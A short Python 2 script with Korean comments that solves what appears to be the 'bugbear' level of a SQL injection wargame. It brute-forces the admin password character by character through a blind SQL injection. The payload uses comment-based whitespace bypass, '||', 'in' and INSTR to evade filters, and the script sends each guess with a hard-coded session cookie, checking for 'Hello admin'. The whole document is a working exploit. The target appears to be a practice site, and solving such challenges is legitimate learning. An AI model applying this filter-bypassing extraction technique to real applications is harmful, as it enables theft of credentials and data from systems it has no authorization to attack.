#!/usr/bin/python
#-*-coding:utf-8  -*-


# Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests


password=""


for j in range(1,9):                            # 1~8자리 패스워드를 찾아야함
  print "%d" %j                                 # 현재 몇번째 인지 표시
  for i in range(48,128):                       # 대부분의 글자들 다 찾아내기
	url='https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0/**/||/**/id/**/in/**/(%22ADMIN%22)/**/%26%26/**/INSTR(pw,"'+password+chr(i)+'")/**/in/**/("1")%23'
	r = requests.post(url,cookies=(dict(PHPSESSID="nrlsfm5sf4fmh67tv514lgn4jl"))) # 자신의 Session ID를 넣어야함.
	print str(j)+"번째 찾는 중 : "+chr(i)     # 대략적인 현재 위치를 확인하기 위함, 없어도 되는 코
	if 'Hello admin' in r.text:                 # 글자를 찾았을 경우!
	      password = password + chr(i)
	      print "[+]Password : " + password
	      break
